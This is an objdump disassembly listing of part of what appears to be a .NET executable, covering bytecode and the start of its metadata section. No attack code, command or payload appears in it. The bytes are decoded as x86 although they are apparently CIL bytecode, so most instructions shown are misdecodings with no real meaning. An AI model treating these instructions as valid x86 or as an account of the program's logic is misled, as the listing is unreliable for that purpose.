  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	18 27                	sbb    %ah,(%edi)
  405a26:	00 00                	add    %al,(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 40 45             	add    %al,0x45(%eax)
  405a36:	00 00                	add    %al,(%eax)
  405a38:	84 28                	test   %ch,(%eax)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 c4                	add    %al,%ah
  405a41:	6d                   	insl   (%dx),%es:(%edi)
  405a42:	00 00                	add    %al,(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 d4                	add    %dl,%ah
  405a51:	6d                   	insl   (%dx),%es:(%edi)
  405a52:	00 00                	add    %al,(%eax)
  405a54:	40                   	inc    %eax
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	8e 14 01             	mov    (%ecx,%eax,1),%ss
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 56 21             	add    %dl,0x21(%esi)
  405ae6:	41                   	inc    %ecx
  405ae7:	18 0a                	sbb    %cl,(%edx)
  405ae9:	00 4c 00 27          	add    %cl,0x27(%eax,%eax,1)
  405aed:	1f                   	pop    %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	83 21 a5             	andl   $0xffffffa5,(%ecx)
  405af3:	20 0a                	and    %cl,(%edx)
  405af5:	00 f5                	add    %dh,%ch
  405af7:	17                   	pop    %ss
  405af8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405af9:	26 06                	es push %es
  405afb:	00 2b                	add    %ch,(%ebx)
  405afd:	1d 7a 13 06 00       	sbb    $0x6137a,%eax
  405b02:	1d 10 27 1f 0a       	sbb    $0xa1f2710,%eax
  405b07:	00 1d 19 27 1f 0a    	add    %bl,0xa1f2719
  405b0d:	00 6e 20             	add    %ch,0x20(%esi)
  405b10:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405b11:	26 06                	es push %es
  405b13:	00 d0                	add    %dl,%al
  405b15:	21 41 18             	and    %eax,0x18(%ecx)
  405b18:	0e                   	push   %cs
  405b19:	00 61 1a             	add    %ah,0x1a(%ecx)
  405b1c:	b6 13                	mov    $0x13,%dh
  405b1e:	0e                   	push   %cs
  405b1f:	00 24 21             	add    %ah,(%ecx,%eiz,1)
  405b22:	b6 13                	mov    $0x13,%dh
  405b24:	06                   	push   %es
  405b25:	00 4b 25             	add    %cl,0x25(%ebx)
  405b28:	7a 13                	jp     0x405b3d
  405b2a:	06                   	push   %es
  405b2b:	00 8a 1c 5c 23 06    	add    %cl,0x6235c1c(%edx)
  405b31:	00 b5 18 41 18 0a    	add    %dh,0xa184118(%ebp)
  405b37:	00 b0 1f 2b 00 06    	add    %dh,0x6002b1f(%eax)
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	ab                   	stos   %eax,%es:(%edi)
  405b41:	0a 12                	or     (%edx),%dl
  405b43:	00 19                	add    %bl,(%ecx)
  405b45:	00 bf 1e 12 00 01    	add    %bh,0x100121e(%edi)
  405b4b:	00 41 18             	add    %al,0x18(%ecx)
  405b4e:	12 00                	adc    (%eax),%al
  405b50:	53                   	push   %ebx
  405b51:	10 bf 1e 06 00 be    	adc    %bh,-0x41fff9e2(%edi)
  405b57:	0f 41 18             	cmovno (%eax),%ebx
  405b5a:	06                   	push   %es
  405b5b:	00 a9 13 5c 23 06    	add    %ch,0x6235c13(%ecx)
  405b61:	00 96 1d 28 20 06    	add    %dl,0x620281d(%esi)
  405b67:	00 ff                	add    %bh,%bh
  405b69:	0d 28 20 06 00       	or     $0x62028,%eax
  405b6e:	1d 18 c8 05 06       	sbb    $0x605c818,%eax
  405b73:	00 60 11             	add    %ah,0x11(%eax)
  405b76:	bf 1e 06 00 cd       	mov    $0xcd00061e,%edi
  405b7b:	11 bf 1e 06 00 7d    	adc    %edi,0x7d00061e(%edi)
  405b81:	10 6f 1e             	adc    %ch,0x1e(%edi)
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 df                	add    %bl,%bh
  405b87:	1e                   	push   %ds
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 a5 10 b3 19 06    	add    %ah,0x619b310(%ebp)
  405b91:	00 2c 11             	add    %ch,(%ecx,%edx,1)
  405b94:	b3 19                	mov    $0x19,%bl
  405b96:	06                   	push   %es
  405b97:	00 0d 11 b3 19 06    	add    %cl,0x619b311
  405b9d:	00 b4 11 b3 19 06 00 	add    %dh,0x619b3(%ecx,%edx,1)
  405ba4:	80 11 b3             	adcb   $0xb3,(%ecx)
  405ba7:	19 06                	sbb    %eax,(%esi)
  405ba9:	00 99 11 b3 19 06    	add    %bl,0x619b311(%ecx)
  405baf:	00 bc 10 b3 19 06 00 	add    %bh,0x619b3(%eax,%edx,1)
  405bb6:	f0 10 b3 19 06 00 d7 	lock adc %dh,-0x28fff9e7(%ebx)
  405bbd:	10 cd                	adc    %cl,%ch
  405bbf:	13 06                	adc    (%esi),%eax
  405bc1:	00 91 10 a0 1e 06    	add    %dl,0x61ea010(%ecx)
  405bc7:	00 62 10             	add    %ah,0x10(%edx)
  405bca:	bf 1e 06 00 49       	mov    $0x4900061e,%edi
  405bcf:	11 b3 19 06 00 69    	adc    %esi,0x69000619(%ebx)
  405bd5:	0b 7a 13             	or     0x13(%edx),%edi
  405bd8:	06                   	push   %es
  405bd9:	00 14 23             	add    %dl,(%ebx,%eiz,1)
  405bdc:	41                   	inc    %ecx
  405bdd:	18 06                	sbb    %al,(%esi)
  405bdf:	00 57 22             	add    %dl,0x22(%edi)
  405be2:	41                   	inc    %ecx
  405be3:	18 06                	sbb    %al,(%esi)
  405be5:	00 ad 13 5c 23 0a    	add    %ch,0xa235c13(%ebp)
  405beb:	00 10                	add    %dl,(%eax)
  405bed:	26 27                	es daa
  405bef:	1f                   	pop    %ds
  405bf0:	06                   	push   %es
  405bf1:	00 5b 18             	add    %bl,0x18(%ebx)
  405bf4:	26 26 06             	es es push %es
  405bf7:	00 58 1c             	add    %bl,0x1c(%eax)
  405bfa:	26 26 06             	es es push %es
  405bfd:	00 5b 13             	add    %bl,0x13(%ebx)
  405c00:	26 26 06             	es es push %es
  405c03:	00 3c 1a             	add    %bh,(%edx,%ebx,1)
  405c06:	41                   	inc    %ecx
  405c07:	18 0a                	sbb    %cl,(%edx)
  405c09:	00 9b 20 71 21 0a    	add    %bl,0xa217120(%ebx)
  405c0f:	00 ee                	add    %ch,%dh
  405c11:	21 71 21             	and    %esi,0x21(%ecx)
  405c14:	0a 00                	or     (%eax),%al
  405c16:	03 17                	add    (%edi),%edx
  405c18:	71 21                	jno    0x405c3b
  405c1a:	0a 00                	or     (%eax),%al
  405c1c:	4c                   	dec    %esp
  405c1d:	26 a5                	movsl  %es:(%esi),%es:(%edi)
  405c1f:	20 0a                	and    %cl,(%edx)
  405c21:	00 dd                	add    %bl,%ch
  405c23:	0f a5 20             	shld   %cl,%esp,(%eax)
  405c26:	0a 00                	or     (%eax),%al
  405c28:	c8 0f a5 20          	enter  $0xa50f,$0x20
  405c2c:	06                   	push   %es
  405c2d:	00 3c 14             	add    %bh,(%esp,%edx,1)
  405c30:	41                   	inc    %ecx
  405c31:	18 06                	sbb    %al,(%esi)
  405c33:	00 1e                	add    %bl,(%esi)
  405c35:	1c 41                	sbb    $0x41,%al
  405c37:	18 06                	sbb    %al,(%esi)
  405c39:	00 9d 18 41 18 0a    	add    %bl,0xa184118(%ebp)
  405c3f:	00 1b                	add    %bl,(%ebx)
  405c41:	20 71 21             	and    %dh,0x21(%ecx)
  405c44:	0a 00                	or     (%eax),%al
  405c46:	d5 1f                	aad    $0x1f
  405c48:	71 21                	jno    0x405c6b
  405c4a:	06                   	push   %es
  405c4b:	00 3b                	add    %bh,(%ebx)
  405c4d:	20 41 18             	and    %al,0x18(%ecx)
  405c50:	06                   	push   %es
  405c51:	00 0b                	add    %cl,(%ebx)
  405c53:	0e                   	push   %cs
  405c54:	41                   	inc    %ecx
  405c55:	18 0a                	sbb    %cl,(%edx)
  405c57:	00 e7                	add    %ah,%bh
  405c59:	17                   	pop    %ss
  405c5a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405c5b:	20 0a                	and    %cl,(%edx)
  405c5d:	00 4c 16 a4          	add    %cl,-0x5c(%esi,%edx,1)
  405c61:	26 0a 00             	or     %es:(%eax),%al
  405c64:	be 22 71 21 0a       	mov    $0xa217122,%esi
  405c69:	00 c5                	add    %al,%ch
  405c6b:	19 27                	sbb    %esp,(%edi)
  405c6d:	1f                   	pop    %ds
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	f9                   	stc
  405c71:	1f                   	pop    %ds
  405c72:	94                   	xchg   %eax,%esp
  405c73:	19 06                	sbb    %eax,(%esi)
  405c75:	00 0d 12 41 18 06    	add    %cl,0x6184112
  405c7b:	00 70 16             	add    %dh,0x16(%eax)
  405c7e:	7a 13                	jp     0x405c93
  405c80:	06                   	push   %es
  405c81:	00 3e                	add    %bh,(%esi)
  405c83:	16                   	push   %ss
  405c84:	41                   	inc    %ecx
  405c85:	18 0a                	sbb    %cl,(%edx)
  405c87:	00 cc                	add    %cl,%ah
  405c89:	15 41 18 0a 00       	adc    $0xa1841,%eax
  405c8e:	aa                   	stos   %al,%es:(%edi)
  405c8f:	0f 41 18             	cmovno (%eax),%ebx
  405c92:	06                   	push   %es
  405c93:	00 63 1d             	add    %ah,0x1d(%ebx)
  405c96:	41                   	inc    %ecx
  405c97:	18 06                	sbb    %al,(%esi)
  405c99:	00 fb                	add    %bh,%bl
  405c9b:	22 7a 13             	and    0x13(%edx),%bh
  405c9e:	06                   	push   %es
  405c9f:	00 17                	add    %dl,(%edi)
  405ca1:	18 c8                	sbb    %cl,%al
  405ca3:	05 06 00 01 1e       	add    $0x1e010006,%eax
  405ca8:	7a 13                	jp     0x405cbd
  405caa:	0a 00                	or     (%eax),%al
  405cac:	b7 0d                	mov    $0xd,%bh
  405cae:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405caf:	20 06                	and    %al,(%esi)
  405cb1:	00 15 01 41 18 06    	add    %dl,0x6184101
  405cb7:	00 70 1a             	add    %dh,0x1a(%eax)
  405cba:	c8 05 0a 00          	enter  $0xa05,$0x0
  405cbe:	93                   	xchg   %eax,%ebx
  405cbf:	20 6f 1e             	and    %ch,0x1e(%edi)
  405cc2:	0a 00                	or     (%eax),%al
  405cc4:	b2 1a                	mov    $0x1a,%dl
